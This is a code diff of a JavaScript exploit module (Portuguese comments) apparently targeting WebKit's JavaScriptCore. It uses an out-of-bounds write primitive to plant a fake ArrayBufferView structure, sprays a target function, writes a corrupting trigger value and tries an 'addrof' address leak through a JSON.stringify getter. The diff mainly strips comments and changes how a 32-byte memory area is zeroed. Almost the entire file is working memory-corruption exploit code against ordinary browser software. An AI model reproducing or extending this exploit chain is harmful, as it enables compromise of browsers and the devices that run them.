@@ -4,7 +4,7 @@ import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
-    oob_dataview_real, // Importar para usar diretamente
+    oob_dataview_real,
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
@@ -14,40 +14,40 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v20_Combined";
+const FNAME_MAIN = "ExploitLogic_v20_Combined_Fix1"; // Versão com correção
 
 // --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
 const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58;
-const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; // Placeholder
-const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       // Placeholder (Uint32ArrayType)
+const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; 
+const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       
 const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
 const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
 const FAKE_VIEW_CELLINFO_STATE        = 0x01;
-const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; // Placeholder
-const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; // Aponta para o início da memória "visível" pela view
-const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;     // Tamanho máximo
-const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     // AllowShared
+const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; 
+const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; 
+const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;     
+const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     
 
 // --- Constantes para a parte "AddrOf" ---
-const GETTER_PROPERTY_NAME_ADDROF = "GetterForCombinedTest_v20";
-const PLANT_OFFSET_0x6C_ADDROF    = 0x6C; // Onde plantamos o marcador para a parte alta do addrof
-const PLANT_DWORD_FOR_0x6C_ADDROF = 0x190A190A; // O marcador
-const CORRUPTION_OFFSET_TRIGGER_MAIN = 0x70; // O offset da escrita OOB crítica
-const CORRUPTION_VALUE_TRIGGER_MAIN  = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor escrito
+const GETTER_PROPERTY_NAME_ADDROF = "GetterForCombinedTest_v20Fix1";
+const PLANT_OFFSET_0x6C_ADDROF    = 0x6C; 
+const PLANT_DWORD_FOR_0x6C_ADDROF = 0x190A190A; 
+const CORRUPTION_OFFSET_TRIGGER_MAIN = 0x70; 
+const CORRUPTION_VALUE_TRIGGER_MAIN  = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); 
 
 // --- Constantes para Teste de Leitura da SuperView ---
-const TEST_READ_SPOOFED_SID_OFFSET = 0x400; // Onde plantamos um SID de teste
-const TEST_READ_SPOOFED_SID_VALUE  = 0xFEEDFACE; // Valor do SID de teste
+const TEST_READ_SPOOFED_SID_OFFSET = 0x400; 
+const TEST_READ_SPOOFED_SID_VALUE  = 0xFEEDFACE; 
 
 let combined_test_results = {};
-let target_function_for_addrof_v20; // Objeto para addrof
+let target_function_for_addrof_v20; 
 
 
 // ============================================================
-// FUNÇÃO PRINCIPAL (v20_Combined)
+// FUNÇÃO PRINCIPAL (v20_Combined_Fix1)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    logS3(`--- Iniciando ${FNAME_MAIN}: Teste Combinado AddrOf e Ativação de SuperView Fake ---`, "test", FNAME_MAIN);
+    logS3(`--- Iniciando ${FNAME_MAIN}: Teste Combinado AddrOf e Ativação de SuperView Fake (Fix Limpeza 32B) ---`, "test", FNAME_MAIN);
     
     combined_test_results = {
         getter_called: false,
@@ -56,8 +56,7 @@ export async function sprayAndInvestigateObjectExposure() {
         error: null
     };
 
-    target_function_for_addrof_v20 = function() { return "target_func_v20"; };
-    // Leve spray da função alvo
+    target_function_for_addrof_v20 = function() { return "target_func_v20_fix1"; };
     let sprayedFuncs = [];
     for(let i=0; i < 10; i++) sprayedFuncs.push(target_function_for_addrof_v20);
 
@@ -70,25 +69,31 @@ export async function sprayAndInvestigateObjectExposure() {
 
         // PASSO 0: Limpar áreas relevantes do oob_array_buffer_real
         logS3("PASSO 0: Limpando áreas de trabalho...", "info", FNAME_MAIN);
-        oob_write_absolute(FAKE_VIEW_BASE_OFFSET_IN_OOB, AdvancedInt64.Zero, 32); // Limpa 0x58 até 0x77
-        oob_write_absolute(PLANT_OFFSET_0x6C_ADDROF, AdvancedInt64.Zero, 8);     // Limpa 0x6C até 0x73 (inclui o trigger offset 0x70)
-        oob_write_absolute(TEST_READ_SPOOFED_SID_OFFSET, 0x0, 4); // Limpa o local do SID de teste
+        // CORREÇÃO APLICADA AQUI: Limpar 32 bytes em blocos de 8 bytes
+        const area_to_clean_start = FAKE_VIEW_BASE_OFFSET_IN_OOB; //0x58
+        const area_to_clean_size = 32;
+        logS3(`  Limpando ${area_to_clean_size} bytes a partir de ${toHex(area_to_clean_start)}...`, "info", FNAME_MAIN);
+        for (let i = 0; i < area_to_clean_size / 8; i++) {
+            oob_write_absolute(area_to_clean_start + (i * 8), AdvancedInt64.Zero, 8);
+        }
+        
+        oob_write_absolute(PLANT_OFFSET_0x6C_ADDROF, AdvancedInt64.Zero, 8);     
+        oob_write_absolute(TEST_READ_SPOOFED_SID_OFFSET, 0x0, 4); 
 
         // PASSO 1: Plantar a estrutura FALSA de ArrayBufferView em FAKE_VIEW_BASE_OFFSET_IN_OOB (0x58)
         logS3(`PASSO 1: Plantando estrutura fake de ArrayBufferView em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}...`, "info", FNAME_MAIN);
         const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
-        const typeInfoOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
-        // ... (demais offsets como na v10.4x)
+        const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET; // Offset base para TypeInfo
         const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET;
         const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
         const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
         const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;
 
         oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
-        oob_write_absolute(typeInfoOffset, FAKE_VIEW_TYPEINFO_TYPE, 1); // Assumindo que os offsets de JSCell são para bytes individuais
-        oob_write_absolute(typeInfoOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1);
-        oob_write_absolute(typeInfoOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1);
-        oob_write_absolute(typeInfoOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1);
+        oob_write_absolute(typeInfoBaseOffset + 0, FAKE_VIEW_TYPEINFO_TYPE, 1); // CELL_TYPEINFO_TYPE_FLATTENED_OFFSET
+        oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1); // CELL_TYPEINFO_FLAGS_FLATTENED_OFFSET is type_offset + 1
+        oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1); // CELL_FLAGS_OR_INDEXING_TYPE_FLATTENED_OFFSET is type_offset + 2
+        oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1); // CELL_STATE_FLATTENED_OFFSET is type_offset + 3
         oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8);
         oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
         oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_VALUE, 4);
@@ -99,10 +104,7 @@ export async function sprayAndInvestigateObjectExposure() {
         oob_write_absolute(TEST_READ_SPOOFED_SID_OFFSET, TEST_READ_SPOOFED_SID_VALUE, 4);
         logS3(`PASSO 1.5: Plantado SID de teste ${toHex(TEST_READ_SPOOFED_SID_VALUE)} em ${toHex(TEST_READ_SPOOFED_SID_OFFSET)}`, "info", FNAME_MAIN);
 
-
         // PASSO 2: Plantar o marcador para o "AddrOf" em 0x6C
-        // Este valor (PLANT_DWORD_FOR_0x6C_ADDROF) será a parte ALTA do QWORD lido de 0x68 se o addrof funcionar.
-        // A parte baixa (em 0x68) esperamos que seja parte do ponteiro vazado.
         const value_to_plant_at_0x6C = new AdvancedInt64(PLANT_DWORD_FOR_0x6C_ADDROF, 0x00000000);
         oob_write_absolute(PLANT_OFFSET_0x6C_ADDROF, value_to_plant_at_0x6C, 8);
         logS3(`PASSO 2: Plantado marcador ${value_to_plant_at_0x6C.toString(true)} em oob_buffer[${toHex(PLANT_OFFSET_0x6C_ADDROF)}]`, "info", FNAME_MAIN);
@@ -131,47 +133,19 @@ export async function sprayAndInvestigateObjectExposure() {
         };
 
         // PASSO 4: Escrita OOB CRÍTICA (Trigger)
-        // Esta escrita ocorre DEPOIS de plantar o marcador em 0x6C, mas ANTES do JSON.stringify que aciona o getter.
-        // A escrita em 0x70 (CORRUPTION_OFFSET_TRIGGER_MAIN) sobrescreve a parte alta do valor plantado em 0x6C (value_to_plant_at_0x6C),
-        // o que significa que o PLANT_DWORD_FOR_0x6C_ADDROF não estará mais lá para o getter ler de 0x68.high().
-        // Isso precisa ser ajustado. O trigger deve permitir que o marcador ainda seja lido.
-        // VAMOS ASSUMIR POR AGORA QUE O TRIGGER NÃO SOBRESCREVE DIRETAMENTE 0x6C, mas sim um offset que causa o efeito desejado.
-        // Se CORRUPTION_OFFSET_TRIGGER_MAIN = 0x70, ele sobrescreve a parte alta de 0x6C.
-        // Para este teste, vamos fazer o trigger ser um pouco depois, ou a lógica do getter precisa mudar.
-        // Ou, o valor em 0x68 é formado *pela própria corrupção*.
-
-        // REVISÃO DA LÓGICA DO TRIGGER vs MARCADOR:
-        // Se a escrita em 0x70 é o que *causa* o valor a aparecer em 0x68, então o marcador em 0x6C
-        // deve ser plantado de forma que não seja sobrescrito ou que o valor em 0x68 seja interpretável.
-        // No teste v19c, 0x70 era escrito COM 0xFFFFFFFF_FFFFFFFF.
-        // O valor lido de 0x68 tinha o marcador 0x190A190A na parte alta.
-        // Isso significa que oob_buffer[0x6C-0x6F] continha 0x190A190A.
-        // A escrita em 0x70 com 0xFFFFFFFF_FFFFFFFF não deveria ter afetado 0x6C.
-
         logS3(`PASSO 4: Escrevendo trigger ${CORRUPTION_VALUE_TRIGGER_MAIN.toString(true)} em ${toHex(CORRUPTION_OFFSET_TRIGGER_MAIN)}...`, "warn", FNAME_MAIN);
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_MAIN, CORRUPTION_VALUE_TRIGGER_MAIN, 8);
         
         await PAUSE_S3(100); 
         
         logS3(`PASSO 4.5: Chamando JSON.stringify para acionar getter (tentativa de addrof)...`, "info", FNAME_MAIN);
-        JSON.stringify(getterObjectForCombinedTest); // Aciona o getter que tenta ler o addrof de 0x68
+        JSON.stringify(getterObjectForCombinedTest); 
+        
+        await PAUSE_S3(100); 
 
-        await PAUSE_S3(100); // Pausa após o possível addrof e antes de testar a SuperView
-
-        // PASSO 5: Testar se o oob_dataview_real (ou um novo Uint32Array) se tornou uma "Super View"
-        // Hipótese: A escrita trigger no PASSO 4 pode ter afetado metadados de uma view existente ou
-        // permitido que a estrutura fake em 0x58 seja "ativada".
+        // PASSO 5: Testar se o oob_dataview_real se tornou uma "Super View"
         logS3(`PASSO 5: Testando capacidade de leitura estendida (SuperView?)...`, "test", FNAME_MAIN);
         try {
-            // Usar o oob_dataview_real que já cobre todo o oob_array_buffer_real
-            // Se m_vector da estrutura fake (0x58) foi magicamente aplicado a oob_dataview_real,
-            // então o seu offset base (0) e length (32768) podem ter sido reconfigurados internamente.
-            // No entanto, o objeto oob_dataview_real em si não mudou seus ponteiros internos só porque escrevemos em 0x58.
-            // A melhor forma de testar se a *ESTRUTURA EM 0x58* é funcional é se tivéssemos fakeobj.
-            // Como não temos, vamos apenas tentar ler usando o oob_dataview_real existente, que já tem acesso.
-            // O teste aqui é mais para ver se a leitura funciona e se o valor corresponde.
-            // Uma SuperView real permitiria ler fora do oob_array_buffer_real ou com um m_vector diferente.
-
             logS3(`  Tentando ler SID de teste ${toHex(TEST_READ_SPOOFED_SID_VALUE)} de ${toHex(TEST_READ_SPOOFED_SID_OFFSET)} usando oob_dataview_real...`, "info", FNAME_MAIN);
             const value_read_by_dataview = oob_dataview_real.getUint32(TEST_READ_SPOOFED_SID_OFFSET, true);
             combined_test_results.superview_read_test_value_hex = toHex(value_read_by_dataview);
@@ -179,8 +153,6 @@ export async function sprayAndInvestigateObjectExposure() {
 
             if (value_read_by_dataview === TEST_READ_SPOOFED_SID_VALUE) {
                 logS3("    !!!! SUCESSO NA LEITURA DE TESTE !!!! O SID plantado foi lido corretamente.", "good", FNAME_MAIN);
-                logS3("      Isso confirma que oob_dataview_real pode ler essa posição, mas não valida a SuperView em 0x58 diretamente.", "info", FNAME_MAIN);
-                // Para validar a SuperView em 0x58, precisaríamos de fakeobj para usá-la.
             } else {
                 logS3("    FALHA NA LEITURA DE TESTE: Valor lido não corresponde ao SID plantado.", "warn", FNAME_MAIN);
             }
@@ -189,7 +161,6 @@ export async function sprayAndInvestigateObjectExposure() {
             logS3(`    ERRO ao tentar leitura de teste com oob_dataview_real: ${e_superview_read.message}`, "error", FNAME_MAIN);
         }
 
-        // Log final dos resultados
         logS3("Resultados do Teste Combinado:", "info", FNAME_MAIN);
         for (const key in combined_test_results) {
             logS3(`  ${key}: ${combined_test_results[key]}`, "info", FNAME_MAIN);
@@ -200,7 +171,6 @@ export async function sprayAndInvestigateObjectExposure() {
              document.title = `ADDROF? ${combined_test_results.candidate_addrof_hex}`;
         }
 
-
     } catch (e) {
         combined_test_results.error = (combined_test_results.error || "") + ` General error: ${e.message}`;
         logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_MAIN);
@@ -209,7 +179,7 @@ export async function sprayAndInvestigateObjectExposure() {
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_MAIN} Concluído ---`, "test", FNAME_MAIN);
-        if (document.title.includes(FNAME_MAIN)) { // Se não foi alterado por sucesso/erro específico
+        if (document.title.includes(FNAME_MAIN)) { 
              document.title = `${FNAME_MAIN} Done`;
         }
     }
